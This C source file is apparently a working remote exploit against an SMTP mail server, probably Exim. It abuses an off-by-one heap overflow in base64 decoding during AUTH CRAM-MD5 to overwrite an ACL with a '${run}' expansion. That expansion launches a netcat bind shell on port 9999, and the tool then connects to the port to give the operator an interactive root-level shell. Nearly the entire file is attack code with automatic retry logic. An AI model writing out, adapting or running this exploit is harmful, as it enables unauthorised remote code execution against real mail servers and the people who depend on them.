#define _GNU_SOURCE
#include <sys/socket.h>
#include <sys/types.h>
#include <netdb.h>
#include <arpa/inet.h>
#include <assert.h>
#include <err.h>
#include <errno.h>
#include <getopt.h>
#include <stdarg.h>
#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define COLOR_SHELL "\033[31;01mshell\033[00m > "

#define STORE_BLOCK_SIZE 0x2000

#define alignment ((sizeof(void *) > sizeof(double))? sizeof(void *) : sizeof(double))

typedef struct storeblock {
	struct storeblock *next;
	size_t length;
} storeblock;

#define ALIGNED_SIZEOF_STOREBLOCK \
	(((sizeof(storeblock) + alignment - 1) / alignment) * alignment)

char b64_table[] = {'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J',
                    'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T',
                    'U', 'V', 'W', 'X', 'Y', 'Z', 'a', 'b', 'c', 'd',
                    'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n',
                    'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x',
                    'y', 'z', '0', '1', '2', '3', '4', '5', '6', '7',
                    '8', '9', '+', '/'};

char sender_host_name[] = "localhost.localdomain (";

char shellcode [] = "${run{/bin/bash -c \"nc.traditional -lp 9999 -e /bin/bash\"}}";

bool verbose = false;
unsigned long acl_pointer;

void create_session(int sockfd)
{
	char buf[1024];
	int amt;
	fd_set fds;

	printf("[!] enjoy your shell\n");
	fputs(COLOR_SHELL, stderr);

	while (1) {
		FD_ZERO(&fds);
		FD_SET(sockfd, &fds);
		FD_SET(0, &fds);

		if (select(sockfd+1, &fds, NULL, NULL, NULL) == -1) {
			continue;
		}

		if (FD_ISSET(0, &fds)) {
			if ((amt = read(0, buf, sizeof(buf) - 1)) == 0) {
				err(errno, "connection lost");
			}
			buf[amt] = '\0';
			write(sockfd, buf, strlen(buf));
		}

		if (FD_ISSET(sockfd, &fds)) {
			if ((amt = read(sockfd, buf, sizeof(buf) - 1)) == 0) {
				err(errno, "connection lost");
			}
			buf[amt] = '\0';
			printf("%s", buf);
			fputs(COLOR_SHELL, stderr);
		}
	}
}

int connect_target(char *hostname, int port)
{
	int s;
	struct hostent *hent;
	struct sockaddr_in sa;
	struct in_addr ia;

	hent = gethostbyname(hostname);
	if (hent) {
		memcpy(&ia.s_addr, hent->h_addr, 4);
	}
	else if((ia.s_addr = inet_addr(hostname)) == INADDR_ANY) {
		err(errno, "incorrect address");
	}

	if ((s = socket(AF_INET, SOCK_STREAM, 0)) == -1) {
		err(errno, "socket failed");
	}

	sa.sin_family = AF_INET;
	sa.sin_port = htons(port);
	sa.sin_addr.s_addr = ia.s_addr;

	if (connect(s, (struct sockaddr *)&sa, sizeof(sa)) == -1) {
		return -1;
	}

	return s;
}


void
write_line(int sockfd, const char *fmt, ...)
{
	char *line;
	va_list ap;

	va_start(ap, fmt);
	vasprintf(&line, fmt, ap);
	va_end(ap);
	if (verbose) {
		printf("> %s\n", line);
	}
	if (write(sockfd, line, strlen(line)) < 0) {
		err(errno, "cannot write to server");
	}

	if (write(sockfd, "\n", 1) < 0) {
		err(errno, "cannot write to server");
	}

	free(line);
}

ssize_t
read_line(int sockfd, char **output)
{
	ssize_t ret;
	FILE *sockfp;
	size_t n = 0;
	char *line = NULL;

	sockfp = fdopen(sockfd, "r");
	if (sockfp == NULL) {
		err(errno, "cannot convert fd to FILE pointer");
	}

	if ((ret = getline(&line, &n, sockfp)) < 0) {
		return ret;
	}

	if (verbose) {
		printf("< %s", line);
	}

	if (output != NULL) {
		*output = line;
	} else {
		free(line);
	}

	return ret;
}

void
off_by_one(int sockfd, size_t offset, unsigned char byte)
{
	char *padding;
	unsigned char a = 0x00, b = 0x00;

	offset = offset - ALIGNED_SIZEOF_STOREBLOCK;

	a = (byte & 0xf0) >> 4;
	b = (byte & 0x0f) << 2;

	offset = offset * 4 / 3;
	padding = malloc(offset+1);
	memset(padding, 'A', offset);
	padding[offset] = '\0';

	if (verbose) {
		printf("! off by one at offset %ld with %d\n", offset, byte);
	}
	write_line(sockfd, "%s%c%c", padding, b64_table[a], b64_table[b]);

	free(padding);
}

char *
b64_encode(char *input, size_t len)
{
	int j = 0;
	int i = 0;
	char *encoded = malloc(((len / 3) + 1) * 4 + 1);
	memset(encoded, '\0', ((len / 3) + 1) * 4 + 1);

	while (i <= len) {
		char byte = 0x00;
		if (i == len && j % 4 == 0) {
			break;
		}
		switch (j % 4) {
			case 0:
				byte = (input[i] & 0xfc) >> 2;
				i++;
				break;
			case 1:
				byte = (input[i-1] & 0x03) << 4;
				if (i < len) {
					byte |= (input[i] & 0xf0) >> 4;
				}
				i++;
				break;
			case 2:
				byte = (input[i-1] & 0x0f) << 2;
				if (i < len) {
					byte |= (input[i] & 0xc0) >> 6;
				}
				i++;
				break;
			case 3:
				byte = input[i-1] & 0x3f;
				/* Dont inc i since we didn't encoded it */
				break;

		}
		encoded[j] = b64_table[byte];
		j++;
	}

	for (; j % 4 != 0; j++) {
		encoded[j] = '=';
	}
	return encoded;
}

void
unrecognize(int sockfd, size_t len)
{
	char *buf = NULL;

	len = len - ALIGNED_SIZEOF_STOREBLOCK;

	size_t nonprintcount = (len - 1) / 4;
	size_t buflen = nonprintcount + (len - 1) % 4;

	buf = malloc(buflen + 1);
	memset(buf, 'a', buflen);
	memset(buf, '\x12', nonprintcount);
	buf[buflen] = '\0';
	write_line(sockfd, "%s", buf);

	read_line(sockfd, NULL);
}

void
exploit(char *hostname, int port)
{
	int sockfd, sockfd2;
	const size_t fake_chunk_size = 0x100;
	size_t packet_size;
	int store_block_base_alignement = 0;

	bool warn = true;
	char *buf = malloc(0x4040);
	char *response = NULL;
	char *sender_host_name, *sender_host_address;
	int padding, start_acl_offset = 0x20;
	int acl_offset = start_acl_offset;
	const int align = 8;
	int len_shell = strlen(shellcode) + 1;
	len_shell += (align - (len_shell % align)) % align;

exploit:
	sockfd = connect_target(hostname, port);
	read_line(sockfd, NULL);

	if (warn)
		warnx("stabilizing perm pool");
	memset(buf, 'a', STORE_BLOCK_SIZE);
	buf[STORE_BLOCK_SIZE] = '\0';
	write_line(sockfd, "EHLO %s", buf);
	read_line(sockfd, &response);

	if (strncmp("250-", strtok(response, " "), 4) != 0) {
		errx(EPROTO, "invalid response: %s", response);
	}

	strtok(NULL, " ");
	sender_host_name = strdup(strtok(NULL, " "));
	sender_host_address = strdup(strtok(NULL, " "));
	sender_host_address[strlen(sender_host_address) - 1] = '\0';
	if (warn) {
		warnx("sender_host_name: %s", sender_host_name);
		warnx("sender_host_address: %s", sender_host_address);
	}
	free(response);

	padding = STORE_BLOCK_SIZE - ALIGNED_SIZEOF_STOREBLOCK;
	padding -= strlen(sender_host_address) + 7;
	padding -= strlen(sender_host_name) + strlen(sender_host_address) + 5;
	padding -= strlen(sender_host_name) + strlen(sender_host_address) + 10;
	memset(buf, 'a', padding / 2);
	buf[padding / 2] = '\0';
	write_line(sockfd, "EHLO %s", buf);
	read_line(sockfd, NULL);

	if (warn)
		warnx("creating workspace");
	unrecognize(sockfd, 0x6050);

	if (warn)
		warnx("setting up upward frontier");
	memset(buf, 'a', 0x410);
	buf[0x40f] = '\0';
	write_line(sockfd, "EHLO %s", buf);
	read_line(sockfd, NULL);

	if (warn)
		warnx("creating bottom chunk");
	unrecognize(sockfd, 0x1c10);

	if (warn)
		warnx("creating target chunk");
	memset(buf, 'a', 0x2010);
	buf[0x200f] = '\0';
	write_line(sockfd, "EHLO %s", buf);
	read_line(sockfd, NULL);

	if (warn)
		warnx("corrupting chunk size of target chunk");
	write_line(sockfd, "AUTH CRAM-MD5");
	read_line(sockfd, NULL);
	off_by_one(sockfd, 0x2018, 0xf1);
	read_line(sockfd, NULL);

	if (warn)
		warnx("creating top chunk");
	write_line(sockfd, "AUTH CRAM-MD5");
	read_line(sockfd, NULL);

	/* adjust the prev_size field value in next chunk
	 * to avoid glibc warning during chunk reset
	 */
	packet_size = 0xf00;
	memset(buf, '\0', packet_size);

	for (int i = store_block_base_alignement; i < fake_chunk_size; i += 0x10) {
		assert(i + fake_chunk_size < packet_size);
		/* adjust prev_size value */
		buf[i] = 0xf0;
		buf[i + 1] = 0x20;
		/* adjust chunk size value. LSB bit must be set to 1 */
		buf[i + 0x8] = (fake_chunk_size & 0xff) + 1;
		buf[i + 0x8 + 1] = fake_chunk_size >> 8;

		buf[i + 0x8 + fake_chunk_size] = (fake_chunk_size & 0xff) + 1;
		buf[i + 0x8 + fake_chunk_size + 1] = fake_chunk_size >> 8;
	}

	write_line(sockfd, "%s", b64_encode(buf, packet_size));
	read_line(sockfd, NULL);

	if (warn)
		warnx("releasing target chunk");
	write_line(sockfd, "EHLO a+");
	if (read_line(sockfd, NULL) < 0) {
		warnx("exploit failed, trying again with different alignment");
		store_block_base_alignement = 8;
		close(sockfd);
		warn = false;
		goto exploit;
	}

	if (warn)
		warnx("overlapping top chunk");
	write_line(sockfd, "AUTH CRAM-MD5");
	read_line(sockfd, NULL);
	memset(buf, 0x00, 0x2010 + 3);
	// preserve chunk size
	buf[0x2010 - 0x08] = 0x21;
	buf[0x2010 - 0x08 + 1] = 0x20;
	// alter storeblock's next pointer --> ACL
	buf[0x2010 + 0] = acl_pointer & 0xff;
	buf[0x2010 + 1] = (acl_pointer & 0xff00) >> 8;
	buf[0x2010 + 2] = acl_pointer >> 16;
	write_line(sockfd, "%s;", b64_encode(buf, 0x2010 + 3));
	read_line(sockfd, NULL);

	if (warn)
		warnx("releasing storeblock chain");
	write_line(sockfd, "EHLO pwn");
	if (read_line(sockfd, NULL) < 0) {
		acl_pointer += 0x01 << 12;
		warnx("exploit failed, trying again with different acl pointer 0x%06lx", acl_pointer);
		close(sockfd);
		warn = false;
		goto exploit;
	}
	if (warn) {
		warnx("got a potentially good acl pointer");
		warnx("overwriting acl with shellcode");
	}

	write_line(sockfd, "AUTH CRAM-MD5");
	read_line(sockfd, NULL);
	memset(buf, 0x00, 0x2000);
	for (int i = 0; i + acl_offset + len_shell < 0x2000; i += len_shell) {
		sprintf(buf + acl_offset + i, shellcode);
	}

	write_line(sockfd, "%s", b64_encode(buf, 0x2000));
	read_line(sockfd, NULL);

	if (warn)
		warnx("triggering payload");
	write_line(sockfd, "MAIL FROM: <pwn@pwn.io>");

	sockfd2 = connect_target(hostname, 9999);
	if (sockfd2 < 0) {
		acl_offset += align;
		if (acl_offset > len_shell + start_acl_offset) {
			errx(EINVAL, "exploit failed !!!");
		}
		warnx("exploit failed, trying again with different acl offset 0x%06x", acl_offset);
		close(sockfd);
		warn = false;
		goto exploit;
	}
	else {
		create_session(sockfd2);
	}
}

void
usage(void)
{
	extern char *__progname;
	char usage[] =
		"usage: %s [-hv] <host> <port> <acl_pointer>\n"
		"\n"
		"options:\n"
		"    -h, --help        Print this help\n"
		"    -v, --verbose     Enable verbose output\n";
	printf(usage, __progname, __progname);
}

int
main(int argc, char **argv)
{
	char hostname[80 + 1];
	int port;
	int c;
	static struct option long_options[] = {{"verbose", no_argument, 0, 'v'},
	                                       {"help", no_argument, 0, 'h'},
	                                       {0, 0, 0, 0}};

	while ((c = getopt_long(argc, argv, "vh", long_options, NULL)) != -1) {
		switch (c) {
		case 'v':
			verbose = true;
			break;
		case 'h':
			usage();
			exit(EXIT_SUCCESS);
			break;
		}
	}

	if (argc - optind != 3) {
		usage();
		exit(EXIT_FAILURE);
	}

	strncpy(hostname, argv[optind++], 80);
	printf("[%s]\n", hostname);
	port = atoi(argv[optind++]);
	acl_pointer = strtoul(argv[optind++], NULL, 0);

	exploit(hostname, port);

	return 0;
}
